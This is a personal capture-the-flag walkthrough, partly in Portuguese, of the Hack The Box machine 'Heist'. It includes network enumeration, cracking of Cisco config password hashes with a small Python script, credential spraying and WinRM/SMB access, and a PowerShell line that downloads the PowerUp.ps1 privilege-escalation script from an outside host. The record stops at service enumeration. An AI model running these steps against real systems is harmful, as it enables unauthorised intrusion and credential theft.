Heist
========================

    sudo nmap_enum heist.htb | tee nmap_output.txt


    
     sudo nmap -sU -p 53,161,111,137,139,500,2049 -Pn heist.htb | tee nmap_udp_output.txt

![qownnotes-media-YTznkw](../../../media/qownnotes-media-YTznkw.png)

    sudo nmap -p- -Pn -T5 -n heist.htb | tee nmap_fullportstcp_output.txt

 ![qownnotes-media-ScneAh](../../../media/qownnotes-media-ScneAh.png)


    gobuster dir -u http://heist.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -k -t 16 -o "tcp_port_protocol_s_ext_gobuster.txt"
 
 ![qownnotes-media-AjcbCK](../../../media/qownnotes-media-AjcbCK.png)

 ![qownnotes-media-svZBzJ](../../../media/qownnotes-media-svZBzJ.png)

## Exploitation


![qownnotes-media-reRwac](../../../media/qownnotes-media-reRwac.png)

![qownnotes-media-URsLtn](../../../media/qownnotes-media-URsLtn.png)

![qownnotes-media-pkhnUg](../../../media/qownnotes-media-pkhnUg.png)


security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

Online cracking

https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html

Porém eu utilizei esse script aqui:

Nome do script cisco_5_decrypter.py

```
from passlib.hash import md5_crypt
import sys 

def decrypt(password, hash):

    if md5_crypt.verify(password, hash):
        print("Password Found: %s" % password)
    

def help():
    print("Usage: python cisco_5_decrypter.py <wordlist>")

if(sys.argv[1]):
    try:
        f = open(sys.argv[1], "r", encoding="ISO-8859-1")
    except:
        help()

    temp = f.read().splitlines()
    hash = input("Informe o hash de senha a ser decriptado: ")
    for name in temp:
        decrypt(name, hash)
else:
    help()
```

    python cisco_5_decrypter.py /usr/share/wordlists/rockyou.txt


Credenciais

stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d


Aqui já obtivemos um usuário válido no serviço SMB. Fizemos novas enumerações


    crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt

![qownnotes-media-KxpgcL](../../../media/qownnotes-media-KxpgcL.png)

![qownnotes-media-zFFSCY](../../../media/qownnotes-media-zFFSCY.png)

    evil-winrm -i 10.10.10.149 -u hazard -p stealth1agent
    rpcclient --user hazard%stealth1agent --command whoami;ipconfig 10.10.10.149
    ## Esse cara de cima não funciona
    ## Esse abaixo funciona:
    rpcclient --user hazard%stealth1agent --command 'enumdomusers' 10.10.10.149
    rpcclient --user hazard%stealth1agent --command 'srvinfo' 10.10.10.149
    smbclient -U hazard -L //10.10.10.149
    smbclient -U hazard //10.10.10.149/IPC$

![qownnotes-media-TNooWt](../../../media/qownnotes-media-TNooWt.png)

Nenhuma com sucesso, porém, teve um comando que funcionou lindo para uma nova enumeração

    enum4linux -a -A -u hazard -p stealth1agent 10.10.10.149  

![qownnotes-media-lZxTJq](../../../media/qownnotes-media-lZxTJq.png)

Adicionei esses novos usuários na lista users.txt e rodei novamente o crackmapexec

    crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt --continue

![qownnotes-media-shsqlB](../../../media/qownnotes-media-shsqlB.png)

    evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'
 

![qownnotes-media-SRAtHf](../../../media/qownnotes-media-SRAtHf.png)

    type ../desktop/user.txt

## PrivEsc

Primeiro eu adicionei o usuário Administrator na user list:

    whoami /all
    (new-object net.webclient).downloadfile('http://<hostname>/PowerUp.ps1', 'c:\temp\pu.ps1')
    . ./pu.ps1
    invoke-allchecks
    systeminfo > si.txt
    crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt --continue
    
    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
    
    